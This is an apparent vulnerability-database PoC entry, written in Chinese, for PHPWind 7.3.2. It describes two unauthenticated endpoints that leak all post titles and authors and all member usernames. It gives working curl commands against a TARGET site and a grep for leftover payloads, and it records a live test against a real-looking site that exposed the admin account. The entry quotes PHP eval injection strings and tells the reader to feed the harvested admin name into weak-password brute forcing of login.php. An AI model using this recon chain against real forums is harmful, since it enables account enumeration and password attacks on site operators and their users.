# PHPWind 零鉴权信息泄露双接口：sitemap.php 泄露全站帖子标题+作者，example.com 泄露全部会员名

- **code**: phpwind-零鉴权信息泄露双接口-sitemap.php-泄露全站帖子标题-作者-example.com-泄露全部会员名
- **kind**: poc
- **category**: info-leak
- **component**: PHPWind 7.3.2
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com/bbs/（PHPWind 7.3.2 / GBK / nginx）实测：① `GET /bbs/sitemap.php` → HTTP 200 / **432789 字节**，GB2312 XML，含 1000 个 <item>，每个暴露 read.php?tid=N + 帖子标题 + 发帖时间 + 阅读数；`<version>PHPWind 7.3.2 Certificate</version>` 直接给出精确版本；由 tid=33710 的发帖人字段拿到管理员用户名 **admin**（无需枚举）。② `GET /bbs/example.com` → HTTP 200，会员列表直接列出用户名+UID+注册时间（实测含全站 200+ 用户名，含前人演练账号 `${@eval($a)}` uid=8916、`${@eval($_)}` uid=8913、`ctfvip888`、`tuser9z1~tuser9ze`）。两者均无需登录。
- **tags**: phpwind,信息泄露,sitemap,member,零鉴权,用户名枚举,站群
- **created_at**: 2026-10-06T11:11:35.398Z
- **found_by**: vuln-scan

## 描述

PHPWind 7.x/8.x 两个**零鉴权**信息泄露接口，用于拿站点规模、全部帖子标题+作者+阅读数、以及**全部用户名**。这两个接口在 PHPWind 站群上几乎都能用，是拿管理员用户名最快的方式（省掉一整轮用户枚举），也是发现"前人演练痕迹"的入口（实测在本目标上从 sitemap 的帖子作者字段直接拿到管理员用户名 admin）。

## 用法

```
1) 站长名单（帖子作者）：`curl -k "http://TARGET/bbs/sitemap.php" -o sm.xml` —— 返回 GB2312 XML，每个 <item> 含 <link>read.php?tid=N</link>、<title>、<pubDate>、<bbs:hit>；<webMaster> 与 <version>（形如「PHPWind 7.3.2 Certificate」）会直接暴露 CMS 精确版本。\n2) 会员名单：`curl -k "http://TARGET/bbs/example.com"` —— 会员列表（用户名、UID、注册时间、最后登录、发帖数）。\n3) 用 grep 找异常项（前人痕迹/后台名/payload）：\n   grep -oP '(?s)<title>\\K[^<]+' sm.xml | grep -v '业务关键词' | sort -u\n   实测命中过：`A${@print(732189)}B`、`RCE_TRANSFER`（前人的 /e 代码执行测试痕迹）\n4) 拿到的管理员用户名直接喂给 login.php 弱口令爆破（PHPWind 有错误计数，见下）。
```
